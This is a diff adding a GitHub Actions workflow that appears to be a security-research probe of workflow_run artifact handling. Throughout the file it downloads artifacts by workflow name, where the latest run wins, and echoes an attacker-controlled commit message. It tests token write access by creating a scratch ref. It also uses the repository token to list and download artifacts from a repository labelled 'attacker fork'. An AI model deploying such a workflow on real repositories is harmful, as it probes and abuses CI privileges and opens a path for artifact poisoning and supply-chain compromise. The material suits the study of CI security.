@@ -1,0 +1,54 @@
+name: Trusted
+on:
+  workflow_run:
+    workflows: ["CI"]
+    type: completed
+    branches: [main]
+jobs:
+  consume:
+    runs-on: ubuntu-latest
+    env:
+      RUNID: ${{ github.event.workflow_run.id }}
+      WF: ${{ github.event.workflow_run.workflow }}
+      ACTOR: ${{ github.event.workflow_run.actor.login }}
+      HEADMSG: ${{ github.event.workflow_run.head_commit.message }}
+    steps:
+      - name: download pinned to the triggering run
+        uses: actions/download-artifact@v4
+        with:
+          name: build
+          run-id: ${{ env.RUNID }}
+          path: pinned
+      - run: cat pinned/build.txt
+      - name: download by workflow name only (latest run wins)
+        uses: actions/download-artifact@v4
+        with:
+          name: build
+          workflow: CI
+          path: latest
+      - run: cat latest/build.txt
+      - name: inventory + privilege probes
+        run: |
+          echo "triggering run=${RUNID} wf=${WF} actor=${ACTOR}"
+          echo "head commit message (attacker controlled): ${HEADMSG}"
+          echo "--- artifacts visible in this repo ---"
+          gh api "/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=100" \
+            --jq '.artifacts[] | "\(.id) run=\(.workflow_run.id) name=\(.name) created=\(.created_at)"' || true
+          echo "--- can this token write? ---"
+          if gh api -X POST "/repos/${GITHUB_REPOSITORY}/refs" -f ref=scratch/probe -f sha="${GITHUB_SHA}" >/dev/null 2>&1; then
+            echo "TOKEN_WRITE=yes"
+          else
+            echo "TOKEN_WRITE=no"
+          fi
+          echo "--- cross-repo artifact read (attacker fork) ---"
+          gh api "/repos/its-not-elliot/vercel-lab/actions/artifacts?per_page=5" \
+            --jq '.total_count' 2>&1 | head -3
+          echo "--- cross-repo artifact DOWNLOAD with our token ---"
+          AID=$(gh api "/repos/its-not-elliot/vercel-lab/actions/artifacts?per_page=1" --jq '.artifacts[0].id' 2>/dev/null)
+          if [ -n "$AID" ]; then
+            curl -sL -H "Authorization: Bearer $GITHUB_TOKEN" -o /tmp/x.bin \
+              "https://api.github.com/repos/its-not-elliot/vercel-lab/actions/artifacts/${AID}/zip" -w "http=%{http_code}\n"
+            ls -l /tmp/x.bin
+          else
+            echo "no artifacts in fork yet"
+          fi
